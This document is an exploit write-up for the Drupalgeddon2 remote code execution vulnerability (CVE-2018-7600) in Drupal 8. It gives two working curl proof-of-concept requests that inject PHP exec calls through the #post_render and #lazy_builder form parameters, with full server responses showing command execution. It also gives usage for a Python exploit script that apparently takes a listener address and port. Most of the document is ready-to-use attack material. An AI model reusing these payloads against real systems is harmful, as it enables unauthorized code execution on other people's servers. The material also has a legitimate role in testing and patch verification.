# CVE-2018-7600 | Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' RCE (SA-CORE-2018-002)

### Inspired from https://github.com/dreadlocked/Drupalgeddon2
- - -

## Drupal v8.x

_Tested on Drupal v8.4.5 / v8.5.0_


### PoC #1 - #post_render / account/mail / exec
- It uses the `user/register` URL, `#post_render` parameter, targeting `account/mail`, using PHP's `exec` function.

```
  curl -k -i 'http://localhost/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
    --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=uname -a'
```

The server will give 200 response & display JSON.
It **IS** able to render the output in the response _(such as doing uname -a)_.

**Example**

```bash
[g0tmi1k@attacker]$ curl -k -i 'http://localhost/drupal-8.4.5/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=uname -a'
HTTP/1.1 200 OK
Date: Wed, 18 Apr 2018 15:56:29 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.24
Cache-Control: must-revalidate, no-cache, private
X-UA-Compatible: IE=edge
Content-language: en
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Expires: Sun, 19 Nov 1978 05:00:00 GMT
X-Generator: Drupal 8 (https://www.drupal.org)
X-Drupal-Ajax-Token: 1
Content-Length: 280
Content-Type: application/json

[{"command":"insert","method":"replaceWith","selector":null,"data":"Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU\/Linux\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
[g0tmi1k@attacker]$
```

- - -

### PoC #2 - #lazy_builder / timezone/timezone / exec
- It uses the `user/register` URL, `#lazy_builder` parameter, targeting `timezone/timezone`, using PHP's `exec` function.

```
  curl -k -i 'http://localhost/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
    --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/2'
```

The server will give 500 response & display "The website encountered an unexpected error. Please try again later".
It is **NOT** able to render the output in the response _(Blind!)_.

**Example**

```bash
[g0tmi1k@attacker]$ curl -k -i 'http://localhost/drupal-8.4.5/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
    --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/2'
HTTP/1.0 500 500 Service unavailable (with message)
Date: Wed, 18 Apr 2018 15:58:04 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.24
Cache-Control: no-cache, private
Content-Length: 74
Connection: close
Content-Type: text/html

The website encountered an unexpected error. Please try again later.<br />
[g0tmi1k@attacker]$


root@ubuntu140045x64-drupal:~# stat /tmp/2
  File: '/tmp/2'
  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
Device: fd01h/64769d	Inode: 59488       Links: 1
Access: (0644/-rw-r--r--)  Uid: (   33/www-data)   Gid: (   33/www-data)
Access: 2018-04-18 15:58:05.061898957 +0000
Modify: 2018-04-18 15:58:05.061898957 +0000
Change: 2018-04-18 15:58:05.061898957 +0000
 Birth: -
root@ubuntu140045x64-drupal:~#
```

- - -

### Script Usage:
#### Tested on Drupal 8, Drupal 7 part of the exploit is yet to be coded
`python drupalgeddon2.py -t http://xxx.xxx.xxx.xxx -l xxx.xxx.xxx.xxx -p xxxx`

![]()
